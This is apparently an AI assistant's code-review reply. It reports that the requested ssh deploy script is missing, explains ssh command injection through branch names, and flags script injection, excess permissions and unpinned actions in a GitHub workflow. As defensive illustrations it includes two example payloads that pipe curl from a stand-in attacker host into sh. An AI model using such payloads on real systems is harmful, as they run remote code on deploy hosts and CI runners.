I couldn't find the script you described, so I haven't reviewed it. Nothing in this workspace runs `ssh`, and there are no `.sh`/`.bash` files. The only deploy-related files are:

- `.github/workflows/deploy.yml`
- `k8s/deployment.yml` (a Kubernetes manifest with no shell in it)

Could the script be on another branch, or not committed yet? If you paste it or tell me where it is, I'll review it.

**What to check when I review it.** These are the usual problems with an ssh command built from a branch name:

- **The remote shell parses the command a second time.** `ssh host "deploy $BRANCH"` runs that string through the remote shell. A branch named `x;curl evil|sh` or `$(…)` then runs as code on the deploy host. Git allows `;`, `$`, backticks and `|` in branch names. Quoting the variable locally doesn't help, because the remote side parses the text again.
- **The fix:**
  1. Check the branch name against an allowlist and reject anything else, e.g. `[[ $branch =~ ^[A-Za-z0-9._/-]+$ && $branch != -* ]] || exit 2`.
  2. Then either pass it as data (`printf -v q '%q' "$branch"; ssh host "deploy $q"`), or better, send it on stdin or through a forced command on the server so it never becomes shell text.
  3. Never build the command in a string and run it later, and don't use `eval`.
- **The rest:** strict mode, no secrets as command-line arguments, and `-o BatchMode=yes` with a pinned `known_hosts` file instead of `StrictHostKeyChecking=no`.

**`deploy.yml` has a problem of the same kind right now:**

- **Line 14 lets anyone opening a PR inject commands.** `run: echo "Title is ${{ github.event.pull_request.title }}"` inserts the PR title into the script before bash runs it. A title like `"; curl attacker | sh; #` executes on the runner. Fix it by passing the title through an environment variable:
  ```yaml
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: printf 'Title is %s\n' "$PR_TITLE"
  ```
- **Line 7 gives the job far more access than it needs.** `permissions: write-all` hands every step a token that can write to the repo. Reduce it to `contents: read` and add only what the deploy actually needs.
- **Running on `pull_request` means a deploy for every PR.** Including PRs from forks, it runs whatever code the PR contains. Deploys usually trigger on `push` to a protected branch, or use an `environment:` with required reviewers.
- **Line 13 uses a movable tag.** `actions/checkout@v4` can be repointed; pin it to a commit SHA.

I haven't changed anything. Do you want me to apply these workflow fixes?
